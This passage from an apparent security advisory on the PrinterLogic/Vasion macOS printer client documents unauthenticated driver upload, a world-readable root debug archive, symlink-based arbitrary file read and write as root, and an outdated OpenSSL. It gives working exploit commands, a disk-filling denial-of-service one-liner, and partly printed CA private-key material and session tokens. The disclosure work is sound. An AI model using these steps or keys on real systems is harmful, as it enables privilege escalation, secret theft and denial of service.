user@laptop requests % cp /tmp/test.file /opt/PrinterInstallerClient/tmp/requests/26TJdkfj0923lkaFlkSDSDn-202112091901313
user@laptop requests %
</code></pre>
<p>After this file is created inside <code>/opt/PrinterInstallerClient/tmp/requests/</code>, a new task will be created:</p>
<pre><code>2021-12-10 18:37:55,492 (INFO): Creating task:
Command: 'UPLOAD_DRIVER'
Arguments: https:,[redacted].printercloud10.com,/,PHPSESSID=c72968d6e68d781a800528758029b232;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;,printer,p972,,-1
User ID: 501
Group ID: 20
Use UI: True
Origin: 'INTERFACE'
2021-12-10 18:37:55,495 (DEBUG): Checking if home URL should be changed to: https://[redacted].printercloud10.com/
2021-12-10 18:37:55,498 (DEBUG): Getting clientsettings.dat from server (or using cache at /opt/PrinterInstallerClient/tmp/data/clientsettings.dat, if up-to-date)
2021-12-10 18:37:55,532 (DEBUG): Attempting to open: https://[redacted].printercloud10.com/client/gateway.php?redirect=1&amp;ips=192.168.100.28%2C192.168.1.100%2C100.64.0.1&amp;file=/clientsettings.dat&amp;PPPSETID=printer&amp;urlc=&amp;idc=p972&amp;if_no_login=
</code></pre>
<p>A popup will then appear on the laptop, asking to choose a driver to add to the repository:</p>
<p><img alt="" src="images/2025-vasion-report-0-mac-upload-01.png" /></p>
<p><a href="images/2025-vasion-report-0-mac-upload-01-full.png">Click here for full image</a></p>
<p>After choosing a driver, the upload process starts:</p>
<p><img alt="" src="images/2025-vasion-report-0-mac-upload-02.png" /></p>
<p>During the <code>obtaining upload ID</code>, we can see the request is sent to the remote server:</p>
<p>Using Burp, the request is intercepted and blocked. However, the investigation was pot pursued thereafter because testing the remote server is not allowed. No malicious requests were sent to the remote server.</p>
<p><img alt="" src="images/2025-vasion-report-0-mac-upload-03.png" /></p>
<p><a href="images/2025-vasion-report-0-mac-upload-03-full.png">Click here for full image</a></p>
<p>If the request was not dropped, the process would likely have continued and a new driver would have been uploaded on the website.</p>
<p>After analyzing the bzip2 temporary archive that was generated in <code>/tmp</code> and supposed to be sent to the remote server, it was found out that this archive contains multiple programs that will then be provided to other users:</p>
<pre><code>1/Contents/Applications/HP Alerts.app/Contents/MacOS/HP Alerts:                       Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/Applications/HP Email Alerts.app/Contents/MacOS/HP Email Alerts:           Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/Applications/HP Event Status.app/Contents/MacOS/HP Event Status:           Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/Applications/LegacyScanEventHandler.app/Contents/MacOS/LegacyScanEventHandler: Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/Frameworks/HSDCommonLib.framework/Versions/A/Runtime/hppaauthtool:         Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/MacOS/HP Utility:                                                          Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
1/Contents/Resources/launcher:                                                        Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
3/Contents/MacOS/Inkjet2:                                                             Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|BINDS_TO_WEAK&gt;
4:                                                                                    Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL&gt;
5/HPDeviceModel.framework/Versions/4.0/Frameworks/Core.framework/Versions/4.0/XPCServices/com.hp.devicemodel.TransportProxy.xpc/Contents/MacOS/com.hp.devicemodel.TransportProxy:  Mach-O universal binary with 2 architectures: [i386:Mach-O i386 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE|NO_HEAP_EXECUTION&gt;] [x86_64:Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;]
5/HPDeviceModel.framework/Versions/4.0/Runtime/hpdot4d.app/Contents/MacOS/hpdot4d:    Mach-O universal binary with 2 architectures: [i386:Mach-O i386 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE|NO_HEAP_EXECUTION&gt;] [x86_64:Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;]
5/HPDeviceModel.framework/Versions/4.0/Tools/dmfdsclient:                             Mach-O universal binary with 2 architectures: [i386:Mach-O i386 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE|NO_HEAP_EXECUTION&gt;] [x86_64:Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;]
5/HPDeviceMonitoring.framework/Versions/1.0/Helpers/HP Device Monitor Manager.app/Contents/Library/LoginItems/HP Device Monitor.app/Contents/MacOS/HP Device Monitor:  Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
5/HPDeviceMonitoring.framework/Versions/1.0/Helpers/HP Device Monitor Manager.app/Contents/MacOS/HP Device Monitor Manager:                                                                                      Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
5/HPDM.framework/Versions/5.0/Runtime/hpdot4d.app/Contents/MacOS/hpdot4d:             Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
5/HPDM.framework/Versions/5.0/XPCServices/com.hp.dm.5.TransportProxy.xpc/Contents/MacOS/com.hp.dm.5.TransportProxy:                                                                                              Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
6/Contents/MacOS/commandtohp:                                                         Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&gt;
7/Contents/MacOS/pdftopdf:                                                            Mach-O 64-bit x86_64 executable, flags:&lt;NOUNDEFS|DYLDLINK|TWOLEVEL|BINDS_TO_WEAK|PIE&gt;
</code></pre>
<p>An attacker with admin privileges can modify this archive to insert malicious programs.</p>
<p>It is possible to update/change the drivers that will be provided to other users.       </p>
<p>In the security assessment performed in 2022, it was proven that it was possible to upload malicious drivers to the VA/SaaS versions without admin privileges.</p>
<p><a id="mac-insecure-generation-debug-archive"></a></p>
<h2>Details - Insecure generation of debug archive</h2>
<p>The file <code>/opt/PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/task/bundle_debug.pyc.py</code> contains instructions to generate a zip archive when the task <code>BUNDLE_DEBUG</code> is created. Using the API without authentication, it is possible to generate a debug archive as root. The resulting archive will be world-readable and contains secrets.</p>
<p>Content of <code>/opt/PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/task/bundle_debug.pyc.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">12</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">BundleDebug</span>(task<span style="color: #666666">.</span>Task):
 <span style="color: #666666">13</span>     request_name <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;BUNDLE_DEBUG&#39;</span>
 <span style="color: #666666">14</span>     never_execute_for_all_users <span style="color: #666666">=</span> <span style="color: #008000">True</span> 
 <span style="color: #666666">15</span>     never_use_ui <span style="color: #666666">=</span> <span style="color: #008000">True</span> 
[<span style="color: #666666">...</span>]
 <span style="color: #666666">44</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">__call</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">45</span>         zip_name <span style="color: #666666">=</span> datetime<span style="color: #666666">.</span>datetime<span style="color: #666666">.</span>now()<span style="color: #666666">.</span>strftime(<span style="color: #BA2121">&#39;PrinterLogic-Debug-%Y%m</span><span style="color: #BB6688; font-weight: bold">%d</span><span style="color: #BA2121">%H%M%S.zip&#39;</span>)
 <span style="color: #666666">46</span>         zip_path <span style="color: #666666">=</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(<span style="color: #008000">self</span><span style="color: #666666">.</span>_output_directory, zip_name)
 <span style="color: #666666">47</span>         <span style="color: #008000; font-weight: bold">with</span> zipfile<span style="color: #666666">.</span>ZipFile(zip_path, <span style="color: #BA2121">&#39;w&#39;</span>, compression<span style="color: #666666">=</span>(zipfile<span style="color: #666666">.</span>ZIP_BZIP2)):
</pre></div>

<p>Creating a <code>BUNDLE_DEBUG</code> task:</p>
<pre><code>user@laptop ~ % echo -n 'BUNDLE_DEBUG'  &gt; /opt/PrinterInstallerClient/tmp/requests/0gAds9DkaG9934-20211209191990
</code></pre>
<p>A task will be created:</p>
<pre><code>2021-12-10 20:17:10,158 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/0gAds9DkaG9934-20211209191990'
2021-12-10 20:17:10,163 (INFO): Received request: BUNDLE_DEBUG
2021-12-10 20:17:10,166 (INFO): Creating task:
Command: 'BUNDLE_DEBUG'
Arguments: 
User ID: 501
Group ID: 20
Use UI: False
Origin: 'INTERNAL'
</code></pre>
<p>And a resulting file will be created in <code>/opt/PrinterInstallerClient/bin</code>:</p>
<pre>
root@laptop bin # ls -la /opt/PrinterInstallerClient/bin
total 1832
drwxr-xr-x  20 root  wheel     640 Dec 10 20:17 .
drwxr-xr-x  13 root  wheel     416 Dec  9 20:20 ..
<font color=red>-r--r--r--   1 root  wheel  814802 Dec 10 20:17 PrinterLogic-Debug-20211210201710.zip</font>
-r-xr-x---   1 root  wheel     215 Mar  5  2021 ad_override_file.sh
-r-xr-x---   1 root  wheel     269 Mar  5  2021 bundle_debug.sh
-r-xr-x---   1 root  wheel     211 Mar  5  2021 configure_proxy.sh
-r-xr-x---   1 root  wheel     165 Mar  5  2021 disable_home_url_security.sh
-r-xr-x---   1 root  wheel     233 Mar  5  2021 disable_ipp_queue_interpretation.sh
-r-xr-x---   1 root  wheel     209 Mar  5  2021 disable_updates.sh
-r-xr-x---   1 root  wheel     243 Mar  5  2021 ignore_certificate_errors.sh
-r-xr-x---   1 root  wheel    3343 Mar  5  2021 install_fips_openssl.sh
-r-xr-x---   1 root  wheel     214 Mar  5  2021 kerberos_timeout.sh
-r-xr-x---   1 root  wheel     205 Mar  5  2021 lock_home_url.sh
-r-xr-x---   1 root  wheel     188 Mar  5  2021 refresh.sh
-r-xr-x---   1 root  wheel     725 Mar  5  2021 restart_service.sh
-r-xr-x---   1 root  wheel     197 Mar  5  2021 set_home_url.sh
-r-xr-x---   1 root  wheel     332 Mar  5  2021 toggle_debug_mode.sh
-r-xr-x---   1 root  wheel    1559 Mar  5  2021 uninstall.sh
-r-xr-x---   1 root  wheel     212 Mar  5  2021 use_authorization_code.sh
-r-xr-x---   1 root  wheel     210 Mar  5  2021 user_from_file.sh
root@laptop bin #
</pre>

<p>This archive is world-readable and contains some files.</p>
<p>Content of <code>PrinterLogic-Debug-20211210201710.zip</code>:</p>
<pre><code>kali% 7z l PrinterLogic-Debug-20211210201710.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i3-5005U CPU @ 2.00GHz (306D4),ASM,AES-NI)

Scanning the drive for archives:
1 file, 814802 bytes (796 KiB)

Listing archive: PrinterLogic-Debug-20211210201710.zip

--
Path = PrinterLogic-Debug-20211210201710.zip
Type = zip
Physical Size = 814802

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-12-10 20:17:10 .....          269          261  basic_info.txt
2021-12-10 19:49:56 .....         2820         1739  configuration.json
2021-12-10 19:15:16 D....            0            0  data
2021-12-09 18:39:28 .....         1125          617  data/printer_502_m101664.xml
2021-12-07 18:34:50 .....         1074          611  data/printer_488_m101664.xml
2021-12-07 18:43:36 .....         1063          598  data/printer_973_m101664.xml
2021-12-09 18:40:34 .....         1130          620  data/printer_501_m101664.xml
2021-12-09 18:38:40 .....         1096          609  data/printer_499_m101664.xml
2021-12-07 21:38:18 .....         1063          597  data/printer_972_m101664.xml
2021-12-09 16:27:12 .....        15977         6254  data/clientsettings.dat
2021-12-09 18:39:10 .....         1074          596  data/printer_503_m101664.xml
2021-12-09 18:32:38 .....         1102          605  data/printer_500_m101664.xml
2021-12-07 16:53:40 D....            0            0  commands
2021-12-09 19:28:40 D....            0            0  log
2021-12-10 19:49:56 .....           31           70  log/HOMEURL
2021-12-10 17:32:40 .....            2           39  log/service_last_exit
2021-12-10 20:17:10 .....      5261882       308735  log/service_info.log
2021-12-10 20:14:22 .....       114212         4151  log/launchd_service_error.log
2021-12-10 20:17:10 .....      6126626       388599  log/service.log
2021-12-10 19:57:38 .....        36208         2789  log/interface.log
2021-12-10 17:32:40 .....        10605         1464  log/launchd_service.log
2021-12-10 20:15:28 .....       241867        80421  log/cpu.prof
2021-12-10 17:35:02 .....       161358         7113  log/PrinterLogicIdpAuthentication.log
2021-12-07 16:53:40 .....         2068          697  log/install.log
2021-12-09 18:42:44 D....            0            0  printers
2021-12-10 20:12:26 .....          754          428  printers/DIRECT_IP_426.json
2021-12-10 20:12:26 .....          722          422  printers/DIRECT_IP_689.json
2021-12-10 20:12:26 .....          758          425  printers/DIRECT_IP_427.json
2021-12-10 20:12:26 .....          738          429  printers/DIRECT_IP_413.json
2021-12-10 20:17:24 .....          735          362  checkin_info.xml
2021-12-10 20:17:24 .....         3219          749  all_printers.txt
2021-12-07 18:35:52 D....            0            0  cups
2021-12-09 18:42:42 .....         1852          320  cups/access_log
2021-12-10 20:17:18 .....          247          210  job_record.json
2021-12-10 20:17:24 .....            0           14  missing__pull_print_release_record.json
2021-12-10 20:17:24 .....            0           14  missing__service_client
------------------- ----- ------------ ------------  ------------------------
2021-12-10 20:17:24           11991677       810558  31 files, 5 folders
kali%
</code></pre>
<p>The <code>configuration.json</code> file contains:</p>
<ul>
<li>Valid PHP session:</li>
</ul>
<pre>
kali% cat configuration.json 
{
  "home_url": "https://[redacted].printercloud10.com/",
  "home_url_locked": null,
  "session_id": "PHPSESSID=c72968d6e68d781a800528758029b232;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;",
</pre>

<ul>
<li>The <code>data/clientsettings.dat</code> file containing the private key of the previous Certificate Authority (<a href="#mac-hardcoded-private-key">CVE-2025-27685 - Hardcoded Private key for the PrinterLogic CA and Hardcoded password</a>) and SNMP keys:</li>
</ul>
<p><xmp>
kali% cat data/clientsettings.dat | xmllint --format -
[...]
    <setting name="caPrivateKey">-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQCs4uTY7wGVIs14
OPZnEx33WwXg3b5aAEEw6uTiwgutiZojUoAJ7hytkEK7KDOB1TL7/IphKmtJdkix
LgZYiLtRjzejOeQNPNbvROg/TtBADTalWp6d7j3Sr8a6yz0lwbMYgdpmu1M9kxAg
c10PX2tbjcnGfP2LQ5eXofHkkyvGtCaEo9RSs0DOLsIrK9Y6yctz+tKhYca0wPjI
qp0IQBfHaCnskmqrWMlUU2PW9b3cIY96qCI1qvlIYBJwm49tC6Wq84BlkNHmZ/Fz
7i56aAA6F9O46iODUrJvabwDs7N6MSuzoCatC4kciig85pr6jengpWbp3E6Z7ybo
h+fX8seGmYu0QN1/ipAJ5PZ5Dy9RoG7NA66h/EYDWxunL0Oo3w6sZi3LLyLl5Cvt
[...]
    <setting name="snmp_12_community">public</setting>
    <setting name="snmp_12_community_private">private</setting>
[...]
    <setting name="snmp_3_authentication_key">[redacted]</setting>
[...]
    <setting name="snmp_3_privacy_key">[redacted]</setting>
[...]
</xmp></p>
<ul>
<li>XML containing SNMP communities of the printers:</li>
</ul>
<p><xmp>
kali% xmllint --format data/printer_503_m101664.xml
[...]
    <port type="TCP">
      <address host="[redacted]" portnumber="9100"/>
      <protocol type="0"/>
      <snmp>
        <community>[redacted]</community>
[...]
    <port type="TCP">
      <address host="[redacted]" portnumber="9100"/>
      <protocol type="0"/>
      <snmp>
        <community>public</community>
        <deviceindex>1</deviceindex>
      </snmp>
[...]
kali%
</xmp></p>
<p>Any local user can retrieve the configuration of the software, including PHP sessions and SNMP communities of printers.</p>
<p>Any local user can DoS the laptop by creating files using <code>echo -n 'BUNDLE_DEBUG'  &gt; /opt/PrinterInstallerClient/tmp/requests/$RANDOM-$RANDOM</code> and filing the hard disk as root.</p>
<p><a id="mac-arbitrary-file-read"></a></p>
<h2>Details - Arbitrary File Read as root</h2>
<p>It is possible to use the APIs to read the first line of any file in the laptop, even if the permissions don't allow reading this file.</p>
<p><code>/Users/pwnme-admin/secret/not-readable.file</code> is a file with <code>600</code> permissions and the directory <code>/Users/pwnme-admin/secret/</code> is using <code>700</code> permissions - these files are not readable by normal users:</p>
<p>Content of <code>/Users/pwnme-admin/secret/</code>:</p>
<pre><code>sh-3.2# ls -la /Users/pwnme-admin/secret/
total 8
drwx------   3 pwnme-admin  1000   96 Dec  9 19:43 .
drwxr-xr-x  13 pwnme-admin  1000  416 Dec 10 20:57 ..
-rw-------   1 pwnme-admin  1000   13 Dec  9 19:43 not-readable.file
sh-3.2#
</code></pre>
<p>As user, it is impossible to read this file:</p>
<pre><code>user@laptop ~ % ls -la /Users/pwnme-admin/secret/not-readable.file
ls: /Users/pwnme-admin/secret/not-readable.file: Permission denied
user@laptop ~ % cat /Users/pwnme-admin/secret/not-readable.file
cat: /Users/pwnme-admin/secret/not-readable.file: Permission denied
user@laptop ~ %
</code></pre>
<p>Creating a new task using a symbolic link will allow getting the content of the first line of the file, as this file is opened by PrinterInstallerClientService running as root:</p>
<pre><code>user@laptop ~ % ln -s /Users/pwnme-admin/secret/not-readable.file /opt/PrinterInstallerClient/tmp/requests/26TJdkfj0923lkaFlkSDSDn-202112091901313
</code></pre>
<p>And the first line of this file will be saved in the logs. The logs can be read by any user:</p>
<pre>
2021-12-10 21:07:42,743 (INFO): Received request: not-readable
2021-12-10 21:07:42,755 (INFO): Creating task:
<font color=red>Command: 'not-readable'</font>
Arguments: 
User ID: 1001
Group ID: 1000
Use UI: True
Origin: 'INTERFACE'
2021-12-10 21:07:42,762 (ERROR): No matching process task for received request data: not-readable
2021-12-10 21:07:42,764 (INFO): Done with request: not-readable
</pre>

<p>We can confirm as root that the content of the file is <code>not-readable</code>.</p>
<p>Content of <code>/Users/pwnme-admin/secret/not-readable.file</code>:</p>
<pre><code>root@laptop pwnme-admin # cat /Users/pwnme-admin/secret/not-readable.file
not-readable
root@laptop pwnme-admin #
</code></pre>
<p>Any local user can retrieve the first line of any file in the system.</p>
<p><a id="mac-arbitrary-file-write"></a></p>
<h2>Details - Arbitrary File Write as root</h2>
<p>Using the APIs and symbolic links, it is possible to write into files as root.</p>
<p>We will create a file owned by root with <code>600</code> as permissions. The file can be empty or can contain data. For the PoC, the file will contain <code>yo</code>:</p>
<pre><code>root@laptop /tmp # touch /tmp/test
root@laptop /tmp # chmod 600 /tmp/test
root@laptop /tmp # echo yo &gt;&gt; /tmp/test
root@laptop /tmp # ls -la /tmp/test    
-rw-------  1 root  wheel  3 Dec 10 21:55 /tmp/test
root@laptop /tmp # cat /tmp/test
yo
root@laptop /tmp #
</code></pre>
<p>By default, when a task is created and needs to write output, the filename used in the request will be reused in the <code>/opt/PrinterInstallerClient/tmp/responses/</code> output file. We will use the filename <code>1-1</code>.</p>
<p>Creating a symbolic link inside <code>/opt/PrinterInstallerClient/tmp/responses/</code>:</p>
<pre><code>user@laptop responses % ln -s /tmp/test /opt/PrinterInstallerClient/tmp/responses/1-1
</code></pre>
<p>Creating a new task with /opt/PrinterInstallerClient/tmp/requests/1-1:</p>
<pre><code>user@laptop ~ % echo -n GET_CONTEXT_MENU_ITEMS &gt; /opt/PrinterInstallerClient/tmp/requests/1-1
</code></pre>
<p>By checking the logs, we can confirm the symbolic link has been followed:</p>
<pre><code>2021-12-10 22:00:08,035 (INFO): Received request: GET_CONTEXT_MENU_ITEMS
2021-12-10 22:00:08,043 (INFO): Creating task:
Command: 'GET_CONTEXT_MENU_ITEMS'
Arguments: 
User ID: 501
Group ID: 20
Use UI: True
Origin: 'PLUGIN'
2021-12-10 22:00:08,056 (INFO): Done with request: GET_CONTEXT_MENU_ITEMS
2021-12-10 22:00:08,082 (DEBUG): Opening pipe at /opt/PrinterInstallerClient/tmp/responses/1-1 to write response
2021-12-10 22:00:08,102 (DEBUG): Writing plugin response to pipe at: b'1\n2\n[]'
2021-12-10 22:00:08,115 (DEBUG): Done writing response to pipe
</code></pre>
<p>And the /tmp/test file has been overwritten:</p>
<pre><code>root@laptop /tmp # ls -la /tmp/test
-rw-------  1 root  wheel  6 Dec 10 22:00 /tmp/test
root@laptop /tmp # cat /tmp/test
1
2
[]
root@laptop /tmp #
</code></pre>
<p>The potential misuse depends on the output of the task. </p>
<p>Any local user can overwrite files as root.</p>
<p>By overwriting specific files, it is possible to change the configuration of programs and get a Local Privilege Escalation. For example, an attacker updating the homeurl variable used by PrinterLogic to a malicious HTTP server will be able to insert malicious programs inside drivers.</p>
<p><a id="mac-outdated-openssl"></a></p>
<h2>Details - Outdated OpenSSL version</h2>
<p>When running the daemons manually, some warning messages will appear.</p>
<p>Warning messages about OpenSSL:</p>
<pre><code>user@laptop data % /opt/PrinterInstallerClient/service_interface/modules/PrinterLogicIdpAuthentication/PrinterLogicIdpAuthentication current-user http://192.168.100.1 501
/opt/PrinterInstallerClient/service_interface/modules/PrinterLogicIdpAuthentication/cryptography/hazmat/bindings/openssl/binding.py:177: CryptographyDeprecationWarning: OpenSSL version 1.0.2 is no longer supported by the OpenSSL project, please upgrade. The next version of cryptography will drop support for it.
</code></pre>
<p>By analyzing the openssl library at <code>/opt/PrinterInstallerClient/lib/libcrypto.1.0.0.dylib</code>, it appears the version is <code>OpenSSL 1.0.2h-fips  3 May 2016</code>.</p>
<p>This is also confirmed by reading the file <code>/opt/PrinterInstallerClient/bin/install_fips_openssl.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">21</span> <span style="color: #408080; font-style: italic"># Check for existing openssl installation</span>
 <span style="color: #666666">22</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Checking for OpenSSL 1.0.2 with fips wrapper in /usr/local/ssl&quot;</span>
 <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> -f /usr/local/ssl/bin/openssl <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
 <span style="color: #666666">24</span>     <span style="color: #19177C">valid_openssl</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/usr/local/ssl/bin/openssl version | grep <span style="color: #BA2121">&quot;1.0.2&quot;</span> | grep <span style="color: #BA2121">&quot;-fips&quot;</span><span style="color: #008000; font-weight: bold">)</span>
 <span style="color: #666666">25</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> ! -z <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">valid_openssl</span><span style="color: #BB6688; font-weight: bold">}</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
 <span style="color: #666666">26</span>         <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;  Congrats, you already have &#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">valid_openssl</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39; installed!&quot;</span>
 <span style="color: #666666">27</span>         <span style="color: #008000">exit</span> <span style="color: #666666">0</span>
 <span style="color: #666666">28</span>     <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">29</span>         <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;  Replacing </span><span style="color: #008000; font-weight: bold">$(</span>/usr/local/ssl/bin/openssl version<span style="color: #008000; font-weight: bold">)</span><span style="color: #BA2121"> installation found in /usr/local/ssl&quot;</span>
 <span style="color: #666666">30</span>         sudo rm -rf /usr/local/ssl
 <span style="color: #666666">31</span>     <span style="color: #008000; font-weight: bold">fi</span>
 <span style="color: #666666">32</span> <span style="color: #008000; font-weight: bold">fi</span>
 <span style="color: #666666">33</span> 
 <span style="color: #666666">34</span> 
 <span style="color: #666666">35</span> <span style="color: #408080; font-style: italic"># Get all the fun stuff set up</span>
 <span style="color: #666666">36</span> <span style="color: #19177C">_OPENSSL_FIPS_VERSION</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2.0.12&quot;</span>
 <span style="color: #666666">37</span> <span style="color: #19177C">_OPENSSL_VERSION</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;1.0.2h&quot;</span> <span style="color: #408080; font-style: italic"># [1] &lt;------------------ OpenSSL 1.0.2h</span>
 <span style="color: #666666">38</span> <span style="color: #19177C">_OPENSSL_FIPS_NAME</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;openssl-fips-</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_FIPS_VERSION</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>
 <span style="color: #666666">39</span> <span style="color: #19177C">_OPENSSL_NAME</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;openssl-</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_VERSION</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>
 <span style="color: #666666">40</span> <span style="color: #19177C">_OPENSSL_FIPS_TAR</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_FIPS_NAME</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">.tar.gz&quot;</span>
 <span style="color: #666666">41</span> <span style="color: #19177C">_OPENSSL_TAR</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_NAME</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">.tar.gz&quot;</span>
 <span style="color: #666666">42</span> <span style="color: #19177C">_OPENSSL_SOURCE_URL</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;https://www.openssl.org/source/&quot;</span>
 <span style="color: #666666">43</span> <span style="color: #19177C">_CURRENT</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span><span style="color: #008000">pwd</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
 <span style="color: #666666">46</span> <span style="color: #408080; font-style: italic"># Download the files from openssl</span>
